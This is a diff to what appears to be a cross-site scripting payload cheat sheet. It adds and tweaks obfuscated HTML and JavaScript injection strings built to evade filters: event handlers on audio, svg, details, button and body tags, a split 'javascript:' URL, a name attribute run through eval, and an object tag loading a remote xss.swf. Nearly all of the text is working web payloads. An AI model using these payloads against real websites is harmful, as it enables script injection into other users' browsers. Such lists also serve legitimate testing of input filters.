@@ -4,9 +4,7 @@
 #############################################################
 
 
-HTML INJECTION & JAVASCRIPT PAYLOADS:
-
-<AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--renwax23
+<AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x
 
 <mArquee onStart%3D[~[onmouseleave(([[(alert(1))]]))]] ]
 
@@ -16,13 +14,21 @@ HTML INJECTION & JAVASCRIPT PAYLOADS:
 
 <a/onmousemove=alert(1)//>renwax23
 
-<object%20allowscriptaccess=always>%20<param%20name=code%20value=http://renwa.tk/xss.swf>
+<object allowscriptaccess=always><param name=code value=http://renwa.tk/xss.swf>
 
 <svg+onload=eval(location.hash.substr(1))>#alert(1)
 
 <button onmousemove="javascript:alert(1)">renwa
 
 <BoDy%0AOnpaGeshoW=%2bwindow.prompt(1)
+
+<details/open/ontoggle=confirm(%27XSS%27)>
+
+</script><svg><script>alert(1)/&apos;
+
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;// 
+
+<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>	  
 
 <a href=[0x0b]renwax23" onfocus=prompt(1) autofocus fragment="
 
